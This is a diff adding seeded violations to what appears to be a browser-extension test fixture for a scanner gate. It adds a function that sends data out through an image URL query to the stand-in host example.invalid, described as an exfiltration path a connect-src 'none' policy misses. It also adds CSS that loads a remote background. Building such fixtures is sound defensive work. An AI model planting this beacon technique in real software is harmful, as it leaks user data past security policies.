@@ -27,6 +27,15 @@ function syncedAway(settings) {
   chrome.storage.sync.set(settings);
 }
 
+function remoteSubresource(el, data) {
+  // The exfiltration path connect-src 'none' does not close. It needs no fetch
+  // and no response: the request itself carries the payload.
+  el.src = 'https://example.invalid/pixel?d=' + data;
+  el.srcset = 'https://example.invalid/pixel-2x.png 2x';
+}
+
+const POISONED_CSS = '.mark { background: url(https://example.invalid/bg.png); }';
+
 // And a named product, for the brand scanner. Same reason as everything above:
 // if this line stops failing the scan, the gate is broken.
 // Copied the toolbar grouping straight from Flameshot.
